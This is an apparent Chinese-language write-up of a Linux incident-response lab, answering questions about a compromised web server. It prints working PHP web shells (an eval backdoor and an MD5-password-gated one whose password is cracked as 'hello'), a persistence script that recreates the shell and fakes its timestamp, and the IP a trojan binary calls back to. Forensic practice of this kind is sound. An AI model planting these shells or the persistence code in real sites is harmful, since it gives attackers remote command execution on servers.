# 第一章-应急响应-Linux入侵排查

  
  
&lt;!--more--&gt;  
1.web目录存在木马，请找到木马的密码提交  
2.服务器疑似存在不死马，请找到不死马的密码提交  
3.不死马是通过哪个文件生成的，请提交文件名  
4.黑客留下了木马文件，请找出黑客的服务器ip提交  
5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交  
在`/var/www/html`目录下面，发现可疑文件`1.php .shell.php`  
```php  
#1.php  
&lt;?php eval($_POST[1]);?&gt;  
  
#.shell.php  
&lt;?php if(md5($_POST[&#34;pass&#34;])==&#34;5d41402abc4b2a76b9719d911017c592&#34;){@eval($_POST[cmd]);}?&gt;  
```  
解密之后，得`hello`  
在`index.php`发现不死马  
```php  
$file = &#39;/var/www/html/.shell.php&#39;;  
$code = &#39;&lt;?php if(md5($_POST[&#34;pass&#34;])==&#34;5d41402abc4b2a76b9719d911017c592&#34;){@eval($_POST[cmd]);}?&gt;&#39;;  
file_put_contents($file, $code);  
system(&#39;touch -m -d &#34;2021-01-01 00:00:01&#34; .shell.php&#39;);  
usleep(3000);  
```  
存在`shell(1).elf`文件，判断为木马文件，放入到微步进行分析，得到ip 10.11.55.21  
执行`shell(1).elf`，查看去连接了远程ip的哪个端口  
`netstat -antlp| grep 10.11.55.21`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202403151328799.png)

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/  

